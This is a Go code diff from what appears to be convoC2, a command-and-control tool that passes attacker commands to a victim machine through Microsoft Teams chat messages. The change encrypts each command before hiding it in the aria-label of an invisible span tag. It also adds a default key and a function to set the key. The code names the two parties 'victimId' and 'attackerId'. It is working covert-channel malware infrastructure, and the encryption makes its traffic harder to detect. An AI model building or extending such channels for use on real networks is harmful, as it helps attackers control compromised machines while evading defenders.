@@ -9,9 +9,12 @@ import (
 	"regexp"
 	"strings"
 	"time"
+
+	"github.com/cxnturi0n/convoC2/pkg/crypto"
 )
 
 var MsgTimeout int
+var EncryptionKey []byte = crypto.DefaultKey
 
 // https://teams.microsoft.com/api/chatsvc/emea/v1/users/ME/conversations/<ThreadId>/messages
 const chatBaseUrl = "https://teams.microsoft.com/api/chatsvc/emea/v1/users/ME/conversations/"
@@ -42,8 +45,14 @@ func createMessageBody(message string, command string) ([]byte, error) {
 		ContentType string `json:"contenttype"`
 	}
 
-	// Embed the command in aria-label of hidden span tag
-	content := fmt.Sprintf(`<p>%s</p><span aria-label="%s" style="display:none;"></span>`, message, command)
+	// Encrypt the command if encryption is enabled
+	encryptedCommand, err := crypto.Encrypt([]byte(command), EncryptionKey)
+	if err != nil {
+		return nil, fmt.Errorf("failed to encrypt command: %w", err)
+	}
+
+	// Embed the encrypted command in aria-label of hidden span tag
+	content := fmt.Sprintf(`<p>%s</p><span aria-label="%s" style="display:none;"></span>`, message, encryptedCommand)
 
 	requestBody := MessageBody{
 		Type:        "Message",
@@ -184,4 +193,9 @@ func GetChatUrl(victimId string, attackerId string, token string) (string, error
 func cleanCommandOutput(output string) string {
 	cleanedOutput := strings.ReplaceAll(output, "\r", "")
 	return strings.TrimSpace(cleanedOutput)
+}
+
+// SetEncryptionKey updates the encryption key used for command encryption
+func SetEncryptionKey(key []byte) {
+	EncryptionKey = key
 }
